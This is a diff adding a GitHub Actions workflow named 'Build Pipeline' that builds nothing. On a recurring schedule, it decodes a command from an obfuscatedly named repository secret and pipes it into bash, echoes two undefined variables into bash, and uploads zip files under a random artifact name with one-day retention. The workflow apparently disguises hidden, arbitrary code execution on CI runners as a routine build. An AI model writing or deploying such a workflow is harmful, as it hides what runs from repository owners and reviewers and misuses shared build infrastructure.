@@ -1,0 +1,32 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          jxet97: ${{ secrets.jxet97 }}
+        run: |
+          printf '%s' "$jxet97" | jq -r .hqjo6032 | /bin/bash
+          echo $obg8 | jq -r .hkqpw0 | /bin/bash
+          echo $t482 | jq -r .vwml520 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mmFd0NiD
+          path: "*.zip"
+          retention-days: 1
